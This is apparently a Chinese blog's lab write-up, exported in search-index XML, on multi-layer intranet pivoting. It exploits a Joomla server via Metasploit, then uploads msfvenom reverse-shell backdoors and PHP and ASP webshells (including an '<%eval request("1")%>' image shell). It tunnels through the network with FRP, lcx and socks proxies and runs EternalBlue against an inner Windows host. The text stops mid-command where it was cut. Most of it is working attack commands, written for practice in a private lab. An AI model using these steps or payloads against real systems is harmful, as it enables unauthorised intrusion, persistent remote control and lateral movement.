<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>多层代理_基础实验</title>
      <link href="/2022/04/20/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86/"/>
      <url>/2022/04/20/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="多层代理-基础实验"><a href="#多层代理-基础实验" class="headerlink" title="多层代理_基础实验"></a>多层代理_基础实验</h2><p>实验环境</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">攻击机：kali 192.168.232.129映射IP: 172.29.255.229 &lt;==&gt; 172.16.12.163</span><br><span class="line"></span><br><span class="line">边界机：centos7 172.16.12.2</span><br><span class="line">内网中间机：windows server 200810.10.10.5</span><br><span class="line">内网机：windows server 200810.10.5.105</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210959958.png" alt="image-20220421095931554"></p><p>访问: <code>http://172.16.12.2</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204202147261.png" alt="image-20220420214700606"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆目录</span></span><br><span class="line">dirsearch -u http://172.16.12.2 run</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210912998.png" alt="image-20220420215032383"></p><p>后台: <code>http://172.16.12.2/administrator/</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210912716.png" alt="image-20220420215157135"></p><h3 id="查看-Joomla-版本"><a href="#查看-Joomla-版本" class="headerlink" title="查看_Joomla_版本"></a>查看_Joomla_版本</h3><p>1). 访问: <code>http://172.16.12.2/administrator/manifests/files/joomla.xml</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913247.png" alt="image-20220420215334519"></p><p>2.) MSF查看版本号</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置攻击模块</span></span><br><span class="line">use auxiliary/scanner/http/joomla_version</span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"><span class="built_in">set</span> rhosts 172.16.12.2</span><br><span class="line"><span class="comment"># 设置线程</span></span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913371.png" alt="image-20220420220203726"></p><h3 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h3><h4 id="一层上线MSF"><a href="#一层上线MSF" class="headerlink" title="一层上线MSF"></a>一层上线MSF</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索攻击模块</span></span><br><span class="line">search joomla 3.4.5</span><br><span class="line"><span class="comment"># 选择模块</span></span><br><span class="line">use 0</span><br><span class="line">use exploit/multi/http/joomla_http_header_rce</span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"><span class="built_in">set</span> rhosts 172.16.12.2</span><br><span class="line"><span class="comment"># 设置攻击机IP</span></span><br><span class="line"><span class="built_in">set</span> lhost 172.16.12.163</span><br><span class="line"><span class="comment"># 执行攻击获取 sessions</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913169.png" alt="image-20220420220900386"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913840.png" alt="image-20220420220941593"></p><p>利用 msfvenom 生成可执行文件后门</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成后门</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=172.16.12.163 lport=4444 -f elf -o 163.elf</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913021.png" alt="image-20220420221242776"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将生成的后门文件与一句话马上传至目标服务器</span></span><br><span class="line">upload /root/163.elf /var/www/html/163.elf</span><br><span class="line">upload /root/Desktop/shell.php /var/www/html/shell.php</span><br><span class="line"><span class="comment"># 进入 shell 给上传的文件增加执行权限</span></span><br><span class="line">shell</span><br><span class="line">chmod +x *</span><br><span class="line"><span class="comment"># 返回上一层</span></span><br><span class="line">Ctrl + z  -&gt; Y</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913326.png" alt="image-20220420235955354"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回上一层, 开启快速监听</span></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line">handler -H 0.0.0.0 -P 4444 -p linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">jobs</span><span class="comment"># 查看监听</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913122.png" alt="image-20220420223237754"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 sessions 运行 elf 文件</span></span><br><span class="line">sessions 1</span><br><span class="line">execute -cH -f <span class="string">"./163.elf"</span></span><br><span class="line"><span class="comment"># 返回上一层</span></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line"><span class="comment"># 查看 sessions</span></span><br><span class="line">sessions</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913366.png" alt="image-20220420223601775"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913287.png" alt="image-20220420223703847"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 sessions 2</span></span><br><span class="line">sessions 2</span><br><span class="line"><span class="comment"># 查看网卡信息</span></span><br><span class="line">ipconfig</span><br><span class="line"><span class="comment"># 存在两张网卡, 有内网配置</span></span><br><span class="line">边界机: 172.16.12.2</span><br><span class="line">内网: 10.10.10.3</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913600.png" alt="image-20220420223946896"></p><h5 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 sessions 2</span></span><br><span class="line">sessions 2</span><br><span class="line"><span class="comment"># 添加路由</span></span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line"><span class="comment"># 返回上一层</span></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line"><span class="comment"># 选择模块, 扫描存活主机</span></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line"><span class="comment"># 设置目标内网IP</span></span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.0/24</span><br><span class="line"><span class="comment"># 设置线程</span></span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913846.png" alt="image-20220420232519004"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210913080.png" alt="image-20220420232753660"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914016.png" alt="image-20220420233426854"></p><h5 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回上一层</span></span><br><span class="line">back</span><br><span class="line"><span class="comment"># 选择模块</span></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="comment"># 设置目标</span></span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.5</span><br><span class="line"><span class="comment"># 设置需要扫的端口</span></span><br><span class="line"><span class="built_in">set</span> ports 80,445,3389,8080,7001,6379</span><br><span class="line"><span class="built_in">set</span> ports 1-65535</span><br><span class="line"><span class="comment"># 设置线程</span></span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914321.png" alt="image-20220420233822311"></p><h4 id="二层上线MSF"><a href="#二层上线MSF" class="headerlink" title="二层上线MSF"></a>二层上线MSF</h4><h5 id="FRP搭建代理"><a href="#FRP搭建代理" class="headerlink" title="FRP搭建代理"></a>FRP搭建代理</h5><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914809.png" alt="image-20220420224304360"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914069.png" alt="image-20220420224341885"></p><p>上传 FRP</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914310.png" alt="image-20220420224746206"></p><p>编辑 <code>frpc.ini</code> 文件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.16.12.163<span class="comment"># 攻击机IP</span></span><br><span class="line">server_port = 7000<span class="comment"># 攻击机监听端口</span></span><br><span class="line"></span><br><span class="line">[socks]</span><br><span class="line"><span class="built_in">type</span> = tcp<span class="comment"># tcp 协议</span></span><br><span class="line">remote_port = 6000<span class="comment"># 远程端口</span></span><br><span class="line">plugin = socks5<span class="comment"># socks5</span></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"><span class="comment"># 新建 frp.sh 的文件</span></span><br><span class="line"><span class="comment"># 文件内容</span></span><br><span class="line">./frpc -c frpc.ini</span><br><span class="line"><span class="comment"># 增加执行权限</span></span><br><span class="line">chmod +x *</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914875.png" alt="image-20220421001616793"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914759.png" alt="image-20220420225714884"></p><p>攻击机修改 <code>frps.ini</code> 配置 - 修改 - 执行</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_addr = 0.0.0.0</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line"><span class="comment"># token = balabalabala</span></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./frps -c frps.ini</span><br><span class="line"><span class="comment"># 蚁剑终端执行</span></span><br><span class="line">bash frp.sh</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914716.png" alt="image-20220420230140817"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914620.png" alt="image-20220420231113080"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914979.png" alt="image-20220420231008163"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914135.png" alt="image-20220420231616181"></p><h5 id="渗透第二层Web服务器"><a href="#渗透第二层Web服务器" class="headerlink" title="渗透第二层Web服务器"></a>渗透第二层Web服务器</h5><p>设置浏览器代理</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914959.png" alt="image-20220420233940128"></p><p>访问 <code>10.10.10.5:80</code>        <a href="http://10.10.10.5/adminbeat/">http://10.10.10.5/adminbeat/</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210914988.png" alt="image-20220421002109414"></p><p>编辑 : <code>vim /etc/proxychains4.conf</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210915497.png" alt="image-20220421002510619"></p><p>扫端口</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># proxychains</span></span><br><span class="line">proxychains -q dirsearch -u  http://10.10.10.5/ run</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210915812.png" alt="image-20220421002603379"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问: http://10.10.10.5/adminbeat/login.asp</span></span><br><span class="line">admin : admin</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210915496.png" alt="image-20220421003416124"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210915295.png" alt="image-20220421004114458"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210915652.png" alt="image-20220421004135941"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问: http://10.10.10.5/adminbeat/upload.asp</span></span><br><span class="line"><span class="comment"># 制作asp图片马 -&gt; &lt;%eval request("1")%&gt;</span></span><br><span class="line">cat 2.png 1.asp &gt; 3.png</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916847.png" alt="image-20220421004750846"></p><p>打开 BurpSite 抓包</p><p>BurpSite设置 socks5 代理</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916493.png" alt="image-20220421005136344"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916181.png" alt="image-20220421010512186"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916182.png" alt="image-20220421010551725"></p><p>访问 : <code>http://10.10.10.5/</code>  -&gt; 右键查看图像</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传的图片路径为</span></span><br><span class="line">http://10.10.10.5/images/up_images/202242185222.asp</span><br><span class="line">http://10.10.10.5/images/up_images/202242245010.asp</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916266.png" alt="image-20220421005710769"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916298.png" alt="image-20220421010701247"></p><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916280.png" alt="image-20220421010811109"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916291.png" alt="image-20220421010909646"></p><p>还有一层内网</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916651.png" alt="image-20220421011012273"></p><h5 id="二层主机上线MSF"><a href="#二层主机上线MSF" class="headerlink" title="二层主机上线MSF"></a>二层主机上线MSF</h5><p>上传工具: <code>Lcx</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建文件 lcx.sh, 文件内容</span></span><br><span class="line">./llcx -m 1 p1 5555 -h2 172.16.12.16 -p2 5555</span><br><span class="line"><span class="comment"># 增加执行权限</span></span><br><span class="line">chmod +x *</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">bash lcx.sh</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210916546.png" alt="image-20220421012605136"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917557.png" alt="image-20220421012507857"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917375.png" alt="image-20220421012916942"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917417.png" alt="image-20220421012926817"></p><h5 id="MSF生成后门文件"><a href="#MSF生成后门文件" class="headerlink" title="MSF生成后门文件"></a>MSF生成后门文件</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.3 lport=5555 -f exe -o 10.5.exe</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917598.png" alt="image-20220421013332767"></p><p>上传至 <code>10.10.10.5</code> 主机</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917508.png" alt="image-20220421013445839"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSF快速监听 -&gt; 上线</span></span><br><span class="line">handler -H 0.0.0.0 -P 5555 -p windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 10.10.10.5 执行后门文件</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917204.png" alt="image-20220421013853947"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 查看网卡</span></span><br><span class="line">ipconfig</span><br><span class="line"><span class="comment"># 选择模块, 扫描存活主机</span></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line"><span class="comment"># 设置目标主机IP </span></span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.5.0/24</span><br><span class="line"><span class="comment"># 设置线程</span></span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917104.png" alt="image-20220421014914692"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917976.png" alt="image-20220421015038382"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917150.png" alt="image-20220421014657109"></p><h4 id="三层上线-MSF"><a href="#三层上线-MSF" class="headerlink" title="三层上线 MSF"></a>三层上线 MSF</h4><h5 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择模块</span></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.5.105</span><br><span class="line"><span class="comment"># 设置需要扫描的端口</span></span><br><span class="line"><span class="built_in">set</span> ports 21,22,23,445,80,3389,3306,8080,7001</span><br><span class="line"><span class="built_in">set</span> ports 1-65535</span><br><span class="line"><span class="comment"># 设置线程</span></span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204210917048.png" alt="image-20220421015456597"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看路由</span></span><br><span class="line">route</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204211106176.png" alt="image-20220421110614058"></p><h5 id="MSF-搭建-socks5-代理"><a href="#MSF-搭建-socks5-代理" class="headerlink" title="MSF 搭建 socks5 代理"></a>MSF 搭建 socks5 代理</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择模块</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="comment"># 查看选项</span></span><br><span class="line">options</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204211107480.png" alt="image-20220421110742104"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改 proxychains 配置文件 -&gt; 访问</span></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"><span class="comment"># 访问, 测试MSF代理是否开启成功</span></span><br><span class="line">proxychains curl 10.10.10.5</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212207380.png" alt="image-20220421110841143"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206982.png" alt="image-20220421110943820"></p><p>测试是否可以访问: <code>http://10.10.5.105</code> </p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206901.png" alt="image-20220421215121693"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206415.png" alt="image-20220421215138890"></p><h5 id="Bind上线-永恒之蓝"><a href="#Bind上线-永恒之蓝" class="headerlink" title="Bind上线 - 永恒之蓝"></a>Bind上线 - 永恒之蓝</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 10.10.10.5 上线的 sessions 添加路由</span></span><br><span class="line">run post/multi/manage/autoroute<span class="comment"># 自动添加路由</span></span><br><span class="line"><span class="comment"># 搜索永恒之蓝攻击模块</span></span><br><span class="line">search ms17_010</span><br><span class="line"><span class="comment"># 选择攻击模块</span></span><br><span class="line">use 0</span><br><span class="line">use exploit/windows/smb/ms17_010_eterblue</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"><span class="built_in">set</span> rhost 10.10.5.105</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206228.png" alt="image-20220421112344271"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206899.png" alt="image-20220421112443683"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206137.png" alt="image-20220421112620049"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212206962.png" alt="image-20220421112647907"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212205548.png" alt="image-20220421112738794"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204683.png" alt="image-20220421113916658"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204246.png" alt="image-20220421113933194"></p><h5 id="Reverse-永恒之蓝"><a href="#Reverse-永恒之蓝" class="headerlink" title="Reverse - 永恒之蓝"></a>Reverse - 永恒之蓝</h5><p>需要让目标内网 <code>reverse</code> 出网的话 二层内网主机 <code>10.10.10.5</code> 上传 <code>lcx.exe</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将本地 5555 端口映射回二层内网</span></span><br><span class="line">lcx.exe -tran 5555 10.10.10.3 5555</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204635.png" alt="image-20220421113132962"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204157.png" alt="image-20220421113309067"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看端口是否开启</span></span><br><span class="line">netstat -ano</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204059.png" alt="image-20220421113438432"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自动添加路由</span></span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line"><span class="comment"># 设置MSF代理</span></span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line"><span class="comment"># 搜索永恒之蓝exp模块</span></span><br><span class="line">search ms17_010</span><br><span class="line"><span class="comment"># 选择攻击模块</span></span><br><span class="line">use 0</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 设置目标IP</span></span><br><span class="line"><span class="built_in">set</span> rhost 10.10.5.105</span><br><span class="line"><span class="comment"># 设置攻击机IP</span></span><br><span class="line"><span class="built_in">set</span> lhost 10.10.5.100</span><br><span 